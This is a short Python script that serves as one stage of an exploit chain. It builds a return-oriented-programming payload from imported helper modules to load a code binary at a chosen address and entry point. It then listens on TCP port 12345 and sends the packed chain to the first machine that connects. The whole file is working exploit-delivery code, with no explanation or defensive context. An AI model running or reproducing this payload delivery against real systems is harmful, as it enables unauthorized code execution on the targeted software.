from codebin_loader_ropchain import *
from tcp_ropchain import *
from config import *
import socket, time, struct

# Send second payload via tcp
rop_payload = load_code_bin_ropchain(CODE_BIN_PATH, CODE_BIN_TARGET_ADDR, CODE_BIN_ENTRYPOINT)
rop_packet = struct.pack(">%iI" % len(rop_payload), *rop_payload)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 12345))
s.listen(1)
conn = s.accept()
print('Connected by ', conn[1])
conn[0].send(rop_packet)
